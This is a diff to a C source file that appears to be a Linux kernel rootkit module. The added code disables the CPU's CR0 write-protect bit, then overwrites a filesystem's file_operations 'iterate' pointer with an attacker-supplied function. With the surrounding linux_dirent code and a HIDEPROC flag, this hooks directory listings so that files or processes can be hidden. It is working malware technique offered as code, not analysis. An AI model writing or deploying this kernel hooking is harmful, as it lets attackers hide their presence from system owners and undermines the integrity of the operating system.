@@ -63,7 +63,44 @@ struct linux_dirent {
 	} while(0) 
 
 
+//-----------------------------cwg--------------------------------
+// 关闭写保护
+void disable_wp(void) {
+    unsigned long cr0;
+    preempt_disable();
+    cr0 = read_cr0();
+    clear_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+    preempt_enable();
+}
 
+// 打开写保护
+void enable_wp(void) {
+    unsigned long cr0;
+    preempt_disable();
+    cr0 = read_cr0();
+    set_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+    preempt_enable();
+}
+#define set_file_op(path, new_iterate, old_iterate) \
+    {\
+        struct file *filp;\
+        struct file_operations *f_op;\
+        filp = filp_open(path, O_RDONLY, 0);\
+        if (IS_ERR(filp)) {\
+            fm_alert("Failed to open %s with error %ld.\n", path, PTR_ERR(filp));\
+            old_iterate = NULL;\
+        } else {\
+            f_op = (struct file_operations *)filp->f_op;\
+            old_iterate = f_op->iterate;\
+            fm_alert("Changing file_op->iterate from %p to %p.\n", old_iterate, new_iterate);\
+            disable_wp();\
+            f_op->iterate = new_iterate;\
+            enable_wp();\
+        }\
+    }
+//------------------------------------------------------------
 
 enum {
 	HIDEPROC = 0,
